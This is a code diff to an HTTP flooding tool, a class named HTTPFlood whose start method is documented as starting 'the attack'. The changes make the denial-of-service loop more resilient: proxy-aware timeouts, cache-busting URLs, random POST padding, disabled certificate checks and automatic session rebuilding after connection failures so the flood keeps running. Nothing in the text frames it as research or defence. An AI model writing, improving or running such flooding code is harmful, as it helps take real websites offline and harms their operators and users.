@@ -285,11 +285,12 @@ class HTTPFlood:
         session = requests.Session()
         session.verify = False
         
-        # Connection pooling
+        # Connection pooling with better settings
         adapter = requests.adapters.HTTPAdapter(
-            pool_connections=5,
-            pool_maxsize=10,
-            max_retries=0
+            pool_connections=3,
+            pool_maxsize=5,
+            max_retries=0,
+            pool_block=False
         )
         session.mount('http://', adapter)
         session.mount('https://', adapter)
@@ -317,14 +318,16 @@ class HTTPFlood:
                 # Add cache buster
                 target_url = add_cache_buster(target_url)
                 
-                # Send request
+                # Send request with adaptive timeout
+                timeout = 10 if config.proxies else 5
+                
                 if self.method == 'GET':
-                    response = session.get(target_url, headers=headers, timeout=5, allow_redirects=False)
+                    response = session.get(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                 elif self.method == 'POST':
                     data = {'data': 'x' * random.randint(100, 1000)}
-                    response = session.post(target_url, headers=headers, data=data, timeout=5, allow_redirects=False)
+                    response = session.post(target_url, headers=headers, data=data, timeout=timeout, allow_redirects=False)
                 elif self.method == 'HEAD':
-                    response = session.head(target_url, headers=headers, timeout=5, allow_redirects=False)
+                    response = session.head(target_url, headers=headers, timeout=timeout, allow_redirects=False)
                 
                 # Update stats
                 update_stats(
@@ -339,14 +342,44 @@ class HTTPFlood:
                 if config.debug and local_count % 10 == 0:
                     print(f"[DEBUG] Thread {threading.current_thread().name}: {local_count} requests | Status: {response.status_code}")
                 
+            except (requests.exceptions.ConnectionError, 
+                    requests.exceptions.ProxyError,
+                    requests.exceptions.Timeout,
+                    requests.exceptions.TooManyRedirects) as e:
+                update_stats(success=False)
+                if config.debug:
+                    print(f"[DEBUG] Connection error: {type(e).__name__}")
+                # Recreate session on connection pool errors
+                try:
+                    session.close()
+                    session = requests.Session()
+                    session.verify = False
+                    adapter = requests.adapters.HTTPAdapter(
+                        pool_connections=3,
+                        pool_maxsize=5,
+                        max_retries=0,
+                        pool_block=False
+                    )
+                    session.mount('http://', adapter)
+                    session.mount('https://', adapter)
+                except:
+                    pass
+                time.sleep(0.1)  # Longer delay on error
+                
             except Exception as e:
                 update_stats(success=False)
                 if config.debug:
-                    print(f"[DEBUG] Error: {str(e)[:50]}")
+                    print(f"[DEBUG] Error: {type(e).__name__}: {str(e)[:50]}")
+                time.sleep(0.05)
             
-            time.sleep(0.001)  # Small delay
+            else:
+                time.sleep(0.005)  # Small delay on success
         
-        session.close()
+        # Cleanup
+        try:
+            session.close()
+        except:
+            pass
     
     def start(self):
         """Start the attack"""
